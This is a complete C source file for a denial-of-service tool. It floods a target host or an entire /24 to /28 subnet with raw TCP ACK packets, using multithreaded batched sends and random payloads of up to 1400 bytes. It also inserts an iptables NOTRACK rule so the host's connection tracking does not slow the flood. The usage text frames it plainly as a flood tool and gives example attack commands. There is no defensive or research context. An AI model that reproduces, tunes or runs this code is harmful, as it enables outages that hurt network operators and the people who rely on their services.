#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/uio.h>

#define BATCH_MAX 1024

static volatile int running = 1;
static unsigned int g_mark;
static void handle_sigint(int sig) { (void)sig; running = 0; }

typedef struct {
    unsigned long long sent;
    unsigned long long bytes;
    unsigned long long errors;
    unsigned int        pps_cur;
    unsigned long long  bps_cur;
} stats_t;
static stats_t g_stats;

static __thread unsigned int rng_state;

static void seed_rand(unsigned int s) {
    rng_state = s * 2654435761U + 1;
}

static unsigned int get_rand(void) {
    rng_state ^= rng_state << 13;
    rng_state ^= rng_state >> 17;
    rng_state ^= rng_state << 5;
    return rng_state;
}

static unsigned short csum(unsigned short *buf, int nw) {
    unsigned long s = 0;
    int i;
    for (i = 0; i < nw; i++) s += buf[i];
    s = (s >> 16) + (s & 0xffff);
    s += (s >> 16);
    return (unsigned short)(~s);
}

static unsigned int resolve_ip(const char *host) {
    struct addrinfo *ai;
    if (getaddrinfo(host, NULL, NULL, &ai) != 0) return 0;
    unsigned int addr = ((struct sockaddr_in *)ai->ai_addr)->sin_addr.s_addr;
    freeaddrinfo(ai);
    return addr;
}

static unsigned int get_source_ip(unsigned int dst) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 0;
    struct sockaddr_in sin = { .sin_family = AF_INET, .sin_addr.s_addr = dst, .sin_port = htons(80) };
    if (connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0) { close(fd); return 0; }
    struct sockaddr_in local;
    socklen_t len = sizeof(local);
    getsockname(fd, (struct sockaddr *)&local, &len);
    close(fd);
    return local.sin_addr.s_addr;
}

static int parse_cidr(const char *s, unsigned int *base, int *prefix) {
    char *slash = strchr(s, '/');
    if (!slash) return 0;
    char ip[32];
    int l = (int)(slash - s);
    if (l >= (int)sizeof(ip)) return 0;
    memcpy(ip, s, l);
    ip[l] = 0;
    if (inet_pton(AF_INET, ip, base) != 1) return 0;
    *prefix = atoi(slash + 1);
    return (*prefix >= 24 && *prefix <= 28) ? 1 : 0;
}

static void fill_rand(void *buf, size_t len) {
    unsigned char *p = buf;
    for (size_t i = 0; i < len; i++)
        p[i] = (unsigned char)get_rand();
}

static size_t build_ack(char *buf, unsigned int src, unsigned int dst,
                        unsigned short sport, unsigned short dport,
                        unsigned int seq, unsigned int ack_seq,
                        int pay_len) {
    int tcp_len = (int)sizeof(struct tcphdr) + pay_len;
    int pkt_len = (int)sizeof(struct iphdr) + tcp_len;

    struct iphdr *ip = (struct iphdr *)buf;
    ip->version = 4;
    ip->ihl = 5;
    ip->tot_len = htons(pkt_len);
    ip->id = htons((unsigned short)get_rand());
    ip->ttl = 64 + (get_rand() % 8);
    ip->protocol = IPPROTO_TCP;
    ip->saddr = src;
    ip->daddr = dst;
    ip->check = 0;
    ip->check = csum((unsigned short*)ip, 10);

    unsigned char *tcp_raw = (unsigned char *)buf + sizeof(struct iphdr);
    struct tcphdr *tcp = (struct tcphdr *)tcp_raw;
    tcp->source = htons(sport);
    tcp->dest   = htons(dport);
    tcp->seq    = htonl(seq);
    tcp->ack_seq = htonl(ack_seq);

    tcp_raw[12] = (5 << 4);
    tcp_raw[13] = (1 << 4);

    tcp->window = htons((get_rand() % 65535) + 1);
    tcp->urg_ptr = 0;

    if (pay_len > 0) {
        unsigned char *pay = (unsigned char *)(buf + sizeof(struct iphdr) + sizeof(struct tcphdr));
        fill_rand(pay, pay_len);
    }

    unsigned char ph[12];
    memcpy(ph, &src, 4);
    memcpy(ph + 4, &dst, 4);
    ph[8] = 0;
    ph[9] = IPPROTO_TCP;
    unsigned short hl = htons(tcp_len);
    memcpy(ph + 10, &hl, 2);

    tcp->check = 0;
    unsigned char cs[12 + tcp_len];
    memcpy(cs, ph, 12);
    memcpy(cs + 12, tcp, tcp_len);
    tcp->check = csum((unsigned short*)cs, (12 + tcp_len) / 2);

    return pkt_len;
}

static void *ack_worker(void *arg) {
    struct {
        unsigned int src_ip, dst_base;
        int num_hosts, dst_port, duration, pay_len;
    } *cfg = arg;
    char *mem = NULL;
    int sock = -1;

    seed_rand((unsigned int)(unsigned long)pthread_self() ^ (unsigned int)time(NULL));

    int pkt_sz = (int)sizeof(struct iphdr) + (int)sizeof(struct tcphdr) + cfg->pay_len;
    size_t pool = (size_t)pkt_sz * BATCH_MAX
                + sizeof(struct sockaddr_in) * BATCH_MAX
                + sizeof(struct iovec) * BATCH_MAX
                + sizeof(struct mmsghdr) * BATCH_MAX;
    mem = malloc(pool);
    if (!mem) goto cleanup;

    char *pkt_buf = mem;
    struct sockaddr_in *addrs = (struct sockaddr_in *)(pkt_buf + (size_t)pkt_sz * BATCH_MAX);
    struct iovec *iov = (struct iovec *)(addrs + BATCH_MAX);
    struct mmsghdr *msgs = (struct mmsghdr *)(iov + BATCH_MAX);

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("  [worker] socket"); goto cleanup; }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int sndbuf = 16 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    if (g_mark) setsockopt(sock, SOL_SOCKET, SO_MARK, &g_mark, sizeof(g_mark));

    long long deadline = cfg->duration > 0
        ? (long long)time(NULL) + cfg->duration
        : 0x7FFFFFFFFFFFFFFFLL;

    int snd_wait_us = 0;
    int snd_ok = 0;
    while (running && time(NULL) < deadline) {
        unsigned int n;
        for (n = 0; n < BATCH_MAX; n++) {
            unsigned int dst = cfg->dst_base + (get_rand() % (unsigned int)cfg->num_hosts);

            char *pkt = pkt_buf + n * pkt_sz;
            build_ack(pkt, cfg->src_ip, dst,
                      (get_rand() % 28231) + 32768, cfg->dst_port,
                      get_rand(), get_rand(), cfg->pay_len);

            addrs[n].sin_family = AF_INET;
            addrs[n].sin_port = htons(cfg->dst_port);
            addrs[n].sin_addr.s_addr = dst;

            iov[n].iov_base = pkt;
            iov[n].iov_len = pkt_sz;

            msgs[n].msg_hdr.msg_name = &addrs[n];
            msgs[n].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
            msgs[n].msg_hdr.msg_iov = &iov[n];
            msgs[n].msg_hdr.msg_iovlen = 1;
        }

        int off = 0;
        while (off < BATCH_MAX) {
            int ret = sendmmsg(sock, msgs + off, BATCH_MAX - off, 0);
            if (ret > 0) {
                off += ret;
                __sync_add_and_fetch(&g_stats.sent, ret);
                __sync_add_and_fetch(&g_stats.bytes, (unsigned long long)ret * pkt_sz);
                if (snd_wait_us > 0) {
                    snd_ok++;
                    if (snd_ok >= 64) {
                        snd_wait_us >>= 1;
                        snd_ok = 0;
                    }
                }
            } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                if (snd_wait_us == 0) snd_wait_us = 1;
                else if (snd_wait_us < 1024) snd_wait_us <<= 1;
                usleep(snd_wait_us);
            } else if (errno == ENOBUFS) {
                if (snd_wait_us == 0) snd_wait_us = 16;
                else if (snd_wait_us < 4096) snd_wait_us <<= 1;
                usleep(snd_wait_us);
            } else {
                __sync_add_and_fetch(&g_stats.errors, 1);
                break;
            }
        }
    }

cleanup:
    free(mem);
    if (sock >= 0) close(sock);
    return NULL;
}

static void fmt_bw(char *buf, size_t n, unsigned long long bps) {
    if (bps >= 1000000000ULL)
        snprintf(buf, n, "%.2f Gbps", (double)bps / 1000000000.0);
    else if (bps >= 1000000ULL)
        snprintf(buf, n, "%.2f Mbps", (double)bps / 1000000.0);
    else if (bps >= 1000ULL)
        snprintf(buf, n, "%.2f Kbps", (double)bps / 1000.0);
    else
        snprintf(buf, n, "%llu bps", bps);
}

static void *stats_loop(void *arg) {
    int show_bw = (int)(unsigned long)arg;
    unsigned long long last_pkt = 0, last_byte = 0;
    while (running) {
        sleep(2);
        unsigned long long cur_pkt  = __sync_add_and_fetch(&g_stats.sent, 0);
        unsigned long long cur_byte = __sync_add_and_fetch(&g_stats.bytes, 0);
        g_stats.pps_cur = (unsigned int)((cur_pkt - last_pkt) / 2);
        g_stats.bps_cur = (cur_byte - last_byte) * 8 / 2;
        last_pkt  = cur_pkt;
        last_byte = cur_byte;

        char bw[32];
        fmt_bw(bw, sizeof(bw), g_stats.bps_cur);
        if (show_bw)
            printf("\r  %llu pkts  |  %llu err  |  %u pps  |  %s  ",
                   (unsigned long long)g_stats.sent,
                   (unsigned long long)g_stats.errors,
                   g_stats.pps_cur, bw);
        else
            printf("\r  %llu pkts  |  %llu err  |  %u pps  ",
                   (unsigned long long)g_stats.sent,
                   (unsigned long long)g_stats.errors,
                   g_stats.pps_cur);
        fflush(stdout);
    }
    printf("\n");
    return NULL;
}

static void usage(const char *name) {
    fprintf(stderr,
        "Usage: %s <target> <port> <time> [-t threads] [-l len]\n"
        "\n"
        "Raw TCP ACK flood, not spoofed.\n"
        "Target can be a CIDR subnet /24-/28.\n"
        "\n"
        "Options:\n"
        "  -t N          threads  (default 4)\n"
        "  -l N          payload bytes 1-1400  (1 = PPS, 1400 = GBPS, default 1)\n"
        "\n"
        "Examples:\n"
        "  ./ack 1.1.1.0/24 80 60          # flood the /24 subnet\n"
        "  ./ack 1.1.1.1 80 60 -l 1400       # single target, packet len for gbps\n"
        , name, name, name, name);
}

int main(int argc, char **argv) {
    int threads = 4, pay_len = 1, opt;

    while ((opt = getopt(argc, argv, "t:l:h")) != -1) {
        switch (opt) {
        case 't': threads  = atoi(optarg); break;
        case 'l': pay_len  = atoi(optarg); break;
        case 'h': default: usage(argv[0]); return opt == 'h' ? 0 : 1;
        }
    }

    if (optind + 3 > argc) { usage(argv[0]); return 1; }
    const char *target = argv[optind];
    int port = atoi(argv[optind + 1]);
    int duration = atoi(argv[optind + 2]);
    if (port < 1 || port > 65535) { fprintf(stderr, "Invalid port\n"); return 1; }
    if (pay_len < 1)  pay_len = 1;
    if (pay_len > 1400) pay_len = 1400;
    if (geteuid() != 0) { fprintf(stderr, "Root required for raw sockets\n"); return 1; }

    unsigned int dst_base;
    int prefix, num_hosts;
    unsigned int dst_ip;
    char subnet_buf[64] = "";

    if (parse_cidr(target, &dst_base, &prefix)) {
        num_hosts = 1 << (32 - prefix);
        unsigned int h = ntohl(dst_base);
        if (prefix == 28) h &= 0xFFFFFFF0;
        else if (prefix == 27) h &= 0xFFFFFFE0;
        else if (prefix == 26) h &= 0xFFFFFFC0;
        else if (prefix == 25) h &= 0xFFFFFF80;
        else h &= 0xFFFFFF00;
        dst_base = htonl(h);
        dst_ip = dst_base;
        snprintf(subnet_buf, sizeof(subnet_buf), "%d IPs (/%d)", num_hosts, prefix);
    } else if (strchr(target, '/')) {
        fprintf(stderr, "Invalid CIDR: use /24 to /28 only\n"); return 1;
    } else {
        dst_ip = resolve_ip(target);
        if (!dst_ip) { fprintf(stderr, "Cannot resolve %s\n", target); return 1; }
        dst_base = dst_ip;
        num_hosts = 1;
    }

    unsigned int src_ip = get_source_ip(dst_ip);
    if (!src_ip) { fprintf(stderr, "Cannot determine source IP\n"); return 1; }

    struct in_addr sa = { .s_addr = src_ip }, da = { .s_addr = dst_ip };

    struct sigaction sa_sig = { .sa_handler = handle_sigint };
    sigaction(SIGINT, &sa_sig, NULL);
    sigaction(SIGTERM, &sa_sig, NULL);

    g_mark = (unsigned int)(get_rand() & 0xFFFF) + 1;
    if (g_mark) {
        char cmd[128];
        snprintf(cmd, sizeof(cmd),
            "iptables -t raw -I OUTPUT -m mark --mark 0x%x -j NOTRACK 2>/dev/null", g_mark);
        { int _s = system(cmd); (void)_s; }
    }

    int pkt_size = (int)sizeof(struct iphdr) + (int)sizeof(struct tcphdr) + pay_len;
    printf(
        "  Target:   %s:%d\n"
        "  Subnet:   %s\n"
        "  Source:   %s\n"
        "  Threads:  %d\n"
        "  Duration: %ds\n"
        "  Payload:  %d B  (packet %d B)\n"
        "  Mode:     %s\n"
        "  Press Ctrl+C to stop\n\n",
        inet_ntoa(da), port, subnet_buf[0] ? subnet_buf : "single host",
        inet_ntoa(sa), threads,
        duration > 0 ? duration : 0, pay_len, pkt_size,
        pay_len <= 40 ? "PPS" : "Bandwidth");

    struct {
        unsigned int src_ip, dst_base;
        int num_hosts, dst_port, duration, pay_len;
    } cfg = { src_ip, dst_base, num_hosts, port, duration, pay_len };

    pthread_t stat_tid;
    pthread_create(&stat_tid, NULL, stats_loop, (void*)(unsigned long)(pay_len > 40 ? 1 : 0));

    pthread_t *tids = malloc(sizeof(pthread_t) * threads);
    for (int i = 0; i < threads; i++)
        pthread_create(&tids[i], NULL, ack_worker, &cfg);
    for (int i = 0; i < threads; i++)
        pthread_join(tids[i], NULL);

    running = 0;
    pthread_join(stat_tid, NULL);
    free(tids);

    if (g_mark) {
        char cmd[128];
        snprintf(cmd, sizeof(cmd),
            "iptables -t raw -D OUTPUT -m mark --mark 0x%x -j NOTRACK 2>/dev/null", g_mark);
        { int _s = system(cmd); (void)_s; }
    }

    printf("\n  Final: %llu pkts, %llu bytes, %llu errors\n",
           (unsigned long long)g_stats.sent,
           (unsigned long long)g_stats.bytes,
           (unsigned long long)g_stats.errors);
    return 0;
}
